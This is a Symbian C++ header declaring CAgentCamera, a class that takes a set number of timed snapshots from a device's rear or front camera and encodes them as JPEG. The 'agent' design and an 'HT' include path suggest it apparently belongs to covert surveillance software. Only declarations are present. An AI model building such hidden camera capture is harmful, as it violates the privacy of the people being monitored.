/*
 * AgentCamera.h
 *
 *  Created on: 09/giu/2011
 *      Author: Giovanna
 */

#ifndef AGENTCAMERA_H_
#define AGENTCAMERA_H_

// INCLUDES

#include "AbstractAgent.h"

#include <HT\TimeOutTimer.h>
#include <ecam.h>
#include <ImageConversion.h>

enum TEngineState
    {
    EEngineNotReady,
    EEngineReserving,
    EEnginePowering,
    //EEngineNoHardware,
    EEngineIdle,
    //EStartingViewFinder,
    ESnappingPicture,
    EStartToSaveImage,
    EConvertingImage,
    EConverted,
    EFocusing
    };

// CLASS DECLARATION

/**
 *  CAgentCamera
 * 
 */
class CAgentCamera : public CAbstractAgent, public MTimeOutNotifier, public MCameraObserver
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentCamera();

	/**
	 * Two-phased constructor.
	 */
	static CAgentCamera* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentCamera* NewLC(const TDesC8& params);

protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
		
private:
	// From MTimeOutNotifier
    virtual void TimerExpiredL(TAny* src);
    // From MCameraObserver
    virtual void ReserveComplete(TInt aError);
    virtual void PowerOnComplete(TInt aError);
    virtual void ViewFinderFrameReady(CFbsBitmap &aFrame);
    virtual void ImageReady(CFbsBitmap *aBitmap, HBufC8 *aData, TInt aError);
    virtual void FrameBufferReady(MFrameBuffer *aFrameBuffer, TInt aError);
    
    /**
     * Returns highest color mode supported by the HW.
     */
    CCamera::TFormat ImageFormatMax();
    
    /*
     * Returns buffer of converted jpeg image
     */
    HBufC8* CAgentCamera::GetImageBufferL(CFbsBitmap* aBitmap);

	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentCamera();
	

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

private:
	CTimeOutTimer* 			iTimer;
	TTimeIntervalSeconds 	iSecondsInterv;  	// interval among two snapshots
	TInt32					iNumStep;			// number of required snapshots
	TInt32					iPerformedStep;		// number of performed step
	CCamera*				iCamera;
	TInt					iNumCamera;			// number of device camera
	TInt					iCameraIndex;		// 0=rear camera; 1=front camera
	TEngineState			iEngineState;
	TCameraInfo				iInfo;
	CCamera::TFormat		iFormat;
	CImageEncoder*          iEncoder;
	};


#endif /* AGENTCAMERA_H_ */
